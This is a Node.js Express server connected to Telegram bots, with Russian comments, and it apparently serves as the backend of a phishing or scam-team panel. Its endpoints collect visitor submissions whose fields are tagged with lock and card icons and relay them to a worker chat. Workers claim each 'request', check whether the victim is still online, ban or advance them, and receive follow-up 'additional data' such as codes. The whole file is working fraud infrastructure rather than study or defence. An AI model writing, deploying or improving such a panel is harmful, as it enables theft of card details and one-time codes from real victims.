const express = require("express");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

// ===== АНТИКРАШ =====
process.on("unhandledRejection", (err) => {
  console.log("❌ UNHANDLED:", err?.message);
});

process.on("uncaughtException", (err) => {
  console.log("❌ CRASH:", err?.message);
});

app.use(express.json({ limit: "1mb" }));
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// ===== БОТЫ =====
const workerBot = new TelegramBot(process.env.WORKER_BOT_TOKEN, {
  polling: true
});

const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN);

// ===== ENV =====
const adminId = Number(process.env.ADMIN_CHAT_ID);
const workerChat = Number(process.env.WORKER_CHAT_ID);

// ===== SAFE ФУНКЦИИ =====
async function safeSend(bot, chatId, text, opts = {}) {
  try {
    return await bot.sendMessage(chatId, text, opts);
  } catch (e) {
    console.log("send error:", e?.message);
    return null;
  }
}

async function safeEdit(bot, chatId, msgId, text, opts = {}) {
  try {
    return await bot.editMessageText(text, {
      chat_id: chatId,
      message_id: msgId,
      ...opts
    });
  } catch (e) {
    console.log("edit error:", e?.message);
  }
}

async function safeDelete(bot, chatId, msgId) {
  try {
    await bot.deleteMessage(chatId, msgId);
  } catch (e) {
    console.log("delete error:", e?.message);
  }
}

// ===== БАЗЫ =====
let takenRequests = {};
let fullRequests = {};
let shortRequests = {};
let fullMessages = {};
let groupMessages = {};
let seenUsers = {};
let onlineUsers = {};
let bannedUsers = {};
let userStatus = {};

// ===== ONLINE =====
function isOnline(id) {
  if (!onlineUsers[id]) return false;
  return Date.now() - onlineUsers[id] < 20000;
}

// ===== ВХОД =====
app.post("/enter", async (req, res) => {
  const id = req.body.clientId;
  if (!id) return res.json({ ok: false });

  onlineUsers[id] = Date.now();

  await safeSend(enterBot, adminId, `👀 Вход\n🆔 ${id}`);

  res.json({ ok: true });
});

// ===== ПИНГ =====
app.post("/ping", (req, res) => {
  const id = req.body.clientId;
  if (id) onlineUsers[id] = Date.now();
  res.json({ ok: true });
});

// ===== ЗАЯВКА =====
app.post("/send", async (req, res) => {
  const d = req.body;
  const id = d.clientId;

  if (!id) return res.json({ ok: false });
  if (bannedUsers[id]) return res.json({ ok: false });

  const isRepeat = seenUsers[id];
  seenUsers[id] = true;

  const statusText = isRepeat ? "🔁 ПОВТОРНАЯ ЗАЯВКА" : "🆕 НОВАЯ ЗАЯВКА";

  const fullText = `${statusText}

🆔 ID: ${id}

📦 ${d.service}
👤 ${d.name}
📞 ${d.phone}
📅 ${d.email}
🔐 ${d.city}
💳 ${d.comment}`;

  const shortText = `📦 ${d.service}
👤 ${d.name}
📞 ${d.phone}`;

  fullRequests[id] = fullText;
  shortRequests[id] = shortText;

  const msg = await safeSend(workerBot, workerChat, shortText, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📥 Забрать", callback_data: "take_" + id }]
      ]
    }
  });

  if (msg) {
    groupMessages[id] = msg.message_id;
  }

  res.json({ ok: true });
});

// ===== СТАТУС =====
app.get("/status/:id", (req, res) => {
  res.json({ status: userStatus[req.params.id] || "wait" });
});

// ===== ДОП ДАННЫЕ =====
app.post("/send2", async (req, res) => {
  const { id, value } = req.body;
  const owner = takenRequests[id];

  if (owner) {
    await safeSend(workerBot, owner, `📩 ДОП ДАННЫЕ\n\n🆔 ${id}\n💬 ${value}`);
  }

  res.json({ ok: true });
});

// ===== CALLBACK =====
workerBot.on("callback_query", async (q) => {
  const data = q.data;
  const id = data.split("_")[1];

  // ===== ЗАБРАТЬ =====
  if (data.startsWith("take")) {

    if (takenRequests[id]) {
      return workerBot.answerCallbackQuery(q.id, { text: "❌ Уже занято" });
    }

    const user = q.from.username
      ? "@" + q.from.username
      : q.from.first_name;

    takenRequests[id] = q.from.id;

    const sent = await safeSend(workerBot, q.from.id, fullRequests[id], {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🟢 Онлайн?", callback_data: "check_" + id }],
          [
            { text: "🚫 Бан", callback_data: "ban_" + id },
            { text: "✅ Разбан", callback_data: "unban_" + id }
          ],
          [{ text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }]
        ]
      }
    });

    if (sent) {
      fullMessages[id] = sent.message_id;
    }

    await safeEdit(
      workerBot,
      workerChat,
      groupMessages[id],
      `${shortRequests[id]}

👤 Взял: ${user}`,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔓 Освободить", callback_data: "free_" + id }]
          ]
        }
      }
    );

    workerBot.answerCallbackQuery(q.id);
  }

  // ===== ОСВОБОДИТЬ =====
  if (data.startsWith("free")) {

    if (takenRequests[id] !== q.from.id) {
      return workerBot.answerCallbackQuery(q.id, {
        text: "❌ Не твоя"
      });
    }

    delete takenRequests[id];

    await safeDelete(workerBot, q.from.id, fullMessages[id]);

    await safeEdit(
      workerBot,
      workerChat,
      groupMessages[id],
      shortRequests[id],
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "📥 Забрать", callback_data: "take_" + id }]
          ]
        }
      }
    );

    workerBot.answerCallbackQuery(q.id, { text: "Освобождено" });
  }

  // ===== ОНЛАЙН =====
  if (data.startsWith("check")) {
    workerBot.answerCallbackQuery(q.id, {
      text: isOnline(id) ? "🟢 Онлайн" : "🔴 Оффлайн"
    });
  }

  // ===== БАН =====
  if (data.startsWith("ban")) {
    bannedUsers[id] = true;
    workerBot.answerCallbackQuery(q.id);
  }

  if (data.startsWith("unban")) {
    delete bannedUsers[id];
    workerBot.answerCallbackQuery(q.id);
  }

  // ===== ДАЛЬШЕ =====
  if (data.startsWith("allow")) {
    userStatus[id] = "next";
    workerBot.answerCallbackQuery(q.id);
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log("SERVER OK");
});
